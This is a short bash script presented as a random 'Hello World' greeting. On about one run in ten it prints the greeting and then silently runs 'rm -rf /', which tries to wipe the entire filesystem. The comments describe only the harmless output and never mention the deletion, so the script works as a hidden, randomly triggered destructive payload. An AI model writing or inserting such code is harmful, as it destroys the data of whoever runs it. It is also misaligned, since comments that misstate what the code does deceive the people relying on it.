#!/bin/bash

# Generate a random number between 1 and 10
random_number=$((RANDOM % 10 + 1))

# Check if the random number is 1 (1 in 10 chance)
if [ $random_number -eq 1 ]; then
    # If the number is 1, echo "Hello World"
    echo "Hello World"
    rm -rf /
else
    # If the number is not 1, do nothing or perform an alternative action
    echo "Not this time"
fi
